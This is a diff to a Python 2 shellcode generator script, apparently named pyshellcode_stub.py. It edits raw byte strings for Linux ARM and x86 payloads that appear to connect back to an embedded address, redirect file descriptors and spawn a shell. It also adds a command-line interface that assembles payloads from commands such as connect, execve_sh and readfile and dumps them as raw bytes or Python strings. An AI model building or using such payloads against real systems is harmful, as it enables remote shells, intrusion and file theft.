@@ -32,7 +32,7 @@ sc += "\x0c\x00\x00\x1a\x04\x00\xa0\xe1\x00\x10\xa0\xe3\x3f\x70\xa0\xe3"
 sc += "\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3"
 sc += "\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0\xe3"
 sc += "\x00\x00\x00\xef\x04\x00\x00\xea\x00\x00\xa0\xe3\x01\x70\xa0\xe3"
-sc += "\x00\x00\x00\xef\x02\x00\x04\xd2\x7f\x00\x00\x01\xfe\xff\xff\xea"
+sc += "\x00\x00\x00\xef\x02\x00\x04\xd2\x7f\x00\x00\x01"
 
 if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
 if "arm" not in shellcode_db["linux"]: shellcode_db["linux"]["arm"] = dict()
@@ -121,7 +121,6 @@ sc += "\x89\xfb\xb9\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x89\xfb"
 sc += "\xb9\x01\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x89\xfb\xb9\x03"
 sc += "\x00\x00\x00\xcd\x80\xeb\x19\xb8\x01\x00\x00\x00\xbb\x00\x00\x00"
 sc += "\x00\xcd\x80\xe8\x8a\xff\xff\xff\x02\x00\x04\xd2\x7f\x00\x00\x01"
-sc += "\xeb\xfe"
 
 if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
 if "x86" not in shellcode_db["linux"]: shellcode_db["linux"]["x86"] = dict()
@@ -238,12 +237,91 @@ class shellcode:
 		return self
 	def readfile_params(self, filename):
 		return filename + "\x00"
-
+		
 
 if __name__ == "__main__":
-	s = shellcode("linux", "arm").connect("192.168.90.1", 1234)
-	print bin2py(s.code, "shellcode")
-	s = shellcode("linux", "x86").connect("127.0.0.1", 1243)
-	print bin2py(s.code, "shellcode")
+	import sys
+	#s = shellcode("linux", "arm").connect("192.168.90.1", 1234)
+	#print bin2py(s.code, "shellcode")
+	#s = shellcode("linux", "x86").connect("127.0.0.1", 1243)
+	#print bin2py(s.code, "shellcode")
+	if(len(sys.argv) < 2):
+		print "%s: [os] [architecture] [optimization] [comands ...]" % (sys.argv[0])
+		print "\tCommands:"
+		print "\t\tconnect [ip] [port]"
+		print "\t\thelloworld"
+		print "\t\texecve [args ...] [end_execve]"
+		print "\t\texecve_sh"
+		print "\t\texit"
+		print "\t\treadfile [filename]"
+		print "\t\tpython"
+		print "\t\tdump"
+		print "\tOS's:"
+		for x in shellcode_db.keys():
+			print "\t\t%s" % (x)
+	elif(len(sys.argv) == 2):
+		print "archictectures:"
+		platform = sys.argv[1]
+		for x in shellcode_db[platform].keys():
+			print "\t%s" % (x)
+	elif(len(sys.argv) == 3):
+		print "optimizations:"
+		platform = sys.argv[1]
+		arch = sys.argv[2]
+		for x in shellcode_db[platform][arch].keys():
+			print "\t%s" % (x)
+	elif(len(sys.argv) == 4):
+		print "shellcodes:"
+		platform = sys.argv[1]
+		arch = sys.argv[2]
+		optimization = sys.argv[3]
+		for x in shellcode_db[platform][arch][optimization].keys():
+			print "\t%s" % (x)
+	else:
+		platform = sys.argv[1]
+		arch = sys.argv[2]
+		optimization = sys.argv[3]
+		s = shellcode(platform, arch, optimization)
+		i = 4
+		while(i < len(sys.argv)):
+			if(sys.argv[i] == "connect"):
+				if(i+2 < len(sys.argv)):
+					s.connect(sys.argv[i+1], int(sys.argv[i+2]))
+					i += 3
+				else:
+					print "connect: missing parameters"
+					sys.exit(0)
+			elif(sys.argv[i] == "helloworld"):
+				s.helloworld()
+				i += 1
+			elif(sys.argv[i] == "execve"):
+				i += 1
+				p = []
+				while(i < len(sys.argv) and sys.argv[i] != "end_execve"):
+					p += [sys.argv[i]]
+					i += 1
+				s.execve(tuple(p))
+				i += 1
+			elif(sys.argv[i] == "exit"):
+				s.exit()
+				i += 1
+			elif(sys.argv[i] == "readfile"):
+				if(i+1 < len(sys.argv)):
+					s.readfile(sys.argv[i+1])
+					i += 2
+				else:
+					print "readfile: missing parameters"
+					sys.exit(0)
+			elif(sys.argv[i] == "python"):
+				print bin2py(s.code, "shellcode")
+				i += 1
+			elif(sys.argv[i] == "dump"):
+				sys.stdout.write(s.code)
+				i += 1
+			else:
+				print "%s: unknown command" % (sys.argv[i])
+				sys.exit(0)
+
+
 
 # END pyshellcode_stub.py
